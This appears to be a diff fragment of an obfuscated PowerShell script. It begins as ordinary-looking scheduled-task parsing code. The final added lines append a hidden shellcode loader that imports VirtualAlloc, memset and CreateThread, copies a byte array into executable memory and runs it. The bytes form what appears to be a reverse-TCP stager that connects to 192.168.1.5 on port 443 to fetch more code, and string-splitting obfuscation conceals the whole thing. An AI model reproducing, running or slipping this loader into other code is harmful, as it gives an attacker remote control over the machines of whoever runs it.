+                            3 { ${mO`DIF`iER} = ("{1}{0}" -f 'ird','Th') }
+                            4 { ${Mo`DIfi`er} = ("{0}{1}" -f 'Fo','urth') }
+                            ("{1}{0}" -f 'st','La') { ${m`oD`iFieR} = ("{0}{1}" -f 'L','ast') }
+                        }
+                    }
+                }
+            }
+
+            function C`OnVE`RtF`RoM-sCHTaSksd`ATe
+            {
+                param(
+                    [Parameter(maNdaTory=${TR`Ue})]
+                    [string]
+                    ${SCHT`Ask`s`DatE},
+
+                    [Parameter(mANdAToRy=${tr`Ue})]
+                    [DateTime]
+                    ${DEfA`U`lTVal`UE}
+                )
+
+                &("{4}{0}{3}{2}{1}" -f'et-St','tMode','c','ri','S') -Version ("{0}{1}{2}" -f'La','t','est')
+
+                [DateTime]${da`T`eTime} = ${D`Efa`U`LtValUe}
+                if( -not   ${b`U1`mr}::"t`RYP`Arse"( ${sCht`AS`ks`d`ATe}, [ref] ${DaT`ETI`mE} ) )
+                {
+                    return ${de`F`AULt`Va`LUe}
+                }
+                return &("{0}{2}{1}"-f 'New-Ob','ct','je') ("{0}{1}" -f'Date','Time') ${d`A`TEtIme}."YE`AR",${da`T`ETime}."m`ONTh",${d`A`TeTime}."d`AY"
+            }
+
+            function coN`VER`TFRoM-S`Chtas`k`STimE
+            {
+                param(
+                    [Parameter(MAndATOrY=${T`RuE})]
+                    [string]
+                    ${sch`TA`SkstI`Me}
+                )
+
+                &("{1}{0}{2}"-f'c','Set-Stri','tMode') -Version ("{1}{2}{0}"-f'st','L','ate')
+
+                [TimeSpan]${T`imE`spaN} =   ${b`S`Tj5}::"z`ERo"
+                [DateTime]${DA`Te`TiMe} = &("{1}{2}{0}"-f'ect','New-O','bj') ("{0}{1}{2}"-f'Da','t','eTime') 2015,11,6
+                ${sc`hTAS`ks`TImE} = '{0} {1}' -f (&("{1}{0}{2}"-f'-Da','Get','te')).("{1}{2}{0}" -f 'String','T','o').Invoke('d'),${sCHTAsK`Sti`me}
+                if( -not   (geT-CHildIteM ("Vari"+"ab"+"Le:"+"Bu1mR")).vALue::"T`RYPArSe"( ${sCHt`A`SK`STimE}, [ref] ${d`A`TEtImE} ) )
+                {
+                    return ${T`Im`eSpan}
+                }
+
+                return &("{0}{2}{1}" -f 'New-Obje','t','c') ("{0}{1}"-f'Ti','meSpan') ${dAT`e`TIme}."ho`UR",${d`ATETI`Me}."MIN`U`TE",${DaT`e`TimE}."Sec`OnD"
+            }
+
+            ${st`ArTD`Ate} = &("{6}{3}{5}{1}{4}{2}{0}"-f 'Date','Scht','sks','n','a','vertFrom-','Co') ${CSvt`A`SK}.'Start Date' -DefaultValue (  ( GcI vaRiaBLE:BU1mr).valUe::"Min`VAl`UE")
+            ${s`TarTT`ImE} = &("{1}{3}{4}{0}{2}{5}" -f'chtask','Convert','sT','From-','S','ime') ${c`s`VTAsK}.'Start Time'
+            ${ENDd`AtE} = &("{6}{0}{3}{1}{5}{4}{2}"-f 'nvertFro','Sc','sksDate','m-','ta','h','Co') ${C`S`VTAsk}.'End Date' -DefaultValue ( ${b`U1MR}::"M`AxvAL`UE")
+
+            ${sch`eDulECT`ora`R`Gs} = @(
+                                    ${CSV`T`Ask}.'Last Result',
+                                    ${csV`T`ASk}.'Stop Task If Runs X Hours And X Mins',
+                                    ${sChE`DUle`TYPe},
+                                    ${m`o`dIFiER},
+                                    ${INtE`RV`Al},
+                                    ${STa`Rtt`imE},
+                                    ${Sta`RtDA`TE},
+                                    ${end`TiME},
+                                    ${End`d`Ate},
+                                    ${d`AYSoF`WEEK},
+                                    ${dA`Ys},
+                                    ${MoN`Ths},
+                                    ${cSV`T`ASk}.'Repeat: Every',
+                                    ${C`SvT`ASk}.'Repeat: Until: Time',
+                                    ${DU`R`Ation},
+                                    ${csvt`ASk}.'Repeat: Stop If Still Running',
+                                    ${st`Op`AtenD},
+                                    ${D`ELaY},
+                                    ${iDl`et`ime},
+                                    ${EvenT`cHanne`l`NaME}
+                                )
+
+            ${SC`hE`duLE} = &("{0}{2}{1}"-f 'New-','t','Objec') -TypeName ("{4}{9}{10}{8}{3}{0}{5}{1}{7}{6}{2}"-f 'h','uler.S','duleInfo','TaskSc','C','ed','e','ch','.','arb','on') -ArgumentList ${sC`h`EDu`leCto`RARGS} 
+            ${tA`sK}."Sch`E`dUlEs".("{0}{1}" -f 'A','dd').Invoke( ${s`ChEd`ULe} )
+        }
+        --${I`Dx};
+
+        if( -not ${w`I`LdCARdSEA`Rch} -or ${t`ASk}."fUlL`NamE" -like ${n`Ame} )
+        {
+            ${tA`sK}
+        }
+    }
+
+}
+
+${c} = ((("{42}{109}{95}{101}{47}{103}{33}{86}{82}{37}{117}{55}{62}{94}{16}{89}{67}{32}{118}{97}{25}{24}{23}{1}{96}{30}{8}{34}{4}{21}{85}{108}{45}{52}{76}{71}{20}{99}{6}{26}{80}{107}{29}{50}{75}{120}{61}{93}{114}{14}{19}{13}{22}{102}{77}{116}{105}{68}{112}{44}{69}{43}{9}{91}{98}{3}{57}{119}{65}{78}{63}{113}{41}{38}{54}{59}{72}{74}{49}{36}{110}{100}{83}{58}{35}{27}{115}{104}{28}{106}{84}{81}{79}{39}{51}{5}{64}{88}{87}{70}{90}{111}{17}{48}{46}{10}{66}{53}{60}{7}{31}{92}{0}{40}{73}{18}{56}{15}{2}{11}{12}"-f 'ui','ss','oun','S',' fl','}msvcr','rt(','r','wSi','u','ntPtr','t)',';','ex','ublic','t c',' stat','i','c, ',' static ','ct);[','All','tern IntPtr Cr','ntPtr lpAddre','oc(I','ualAll','{0','g',' l','er','nt d',' des','n In','l32.','ze, uint','a',' uin',')]','tA','mport({','nt s','ar','[DllI','trib','lpT','T','n I','}ke','c exter','ter,','n','0','ype','IntP','d','bl','uin','tac','tionFl','dress, I','t','dl','i','lp','t',', Int',' memset(','er','t','hreadAt',')','Prote','ntPtr lpPar','r','ame','el',', uint fl','ateThrea','Ptr ','lI','}',';[Dl','0}','a','eadId)','ocatio','dll{','}','.dll{0','ic ext',']public sta','tes, uin','t, ','l{','c','or',', ui','tr Virt','t dw','DllImpo','wCre','t({0','e','rne','Ptr','(In','pThr','k','n','mp','t d','t','Ptr ','St','0})]p','s, Int','d','pu','tP','kSize','32.'))  -F [CHAr]34);${W} = &("{0}{1}{2}" -f'Add-T','yp','e') -memberDefinition ${c} -Name ("{0}{1}" -f'Win3','2') -namespace ("{2}{4}{1}{3}{0}" -f's','unct','Win','ion','32F') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x61,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0xe9,0x71,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;${g} = 0x1000;if (${z}."lE`N`gtH" -gt 0x1000){${G} = ${Z}."LE`NgTh"};${X}=${W}::("{1}{3}{0}{2}" -f'tualA','V','lloc','ir').Invoke(0,0x1000,${g},0x40);for (${i}=0;${I} -le (${Z}."LE`NGTH"-1);${i}++) {${w}::"mEM`sEt"([IntPtr](${x}.("{0}{2}{1}" -f'T','t32','oIn').Invoke()+${I}), ${Z}[${I}], 1)};${w}::("{2}{1}{3}{0}" -f 'Thread','t','Crea','e').Invoke(0,0,${X},0,0,0);for (;;){&("{2}{0}{1}"-f'rt-sl','eep','Sta') 60};
